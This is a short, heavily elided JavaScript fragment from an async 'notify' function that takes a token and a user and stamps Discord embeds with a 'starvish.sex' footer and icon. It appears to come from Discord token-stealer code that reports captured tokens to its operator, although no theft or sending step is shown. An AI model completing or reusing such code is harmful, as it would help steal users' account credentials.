...
const notify = async (ctx, token, user) => {
    ...
    ctx.embeds.forEach(embed => {
        ...
        embed.footer = {
            text: 'starvish.sex',
            icon_url: "https://cdn.discordapp.com/attachments/1320384728972525618/1357645534655156365/Pngtreeclassic_black_stars_clipart_5568043_1.png?ex=67f0f56f&is=67efa3ef&hm=bc0532d166d21003c8744735daf2db3220f98b6e29fea871959e9d2352f805ab&",
        };
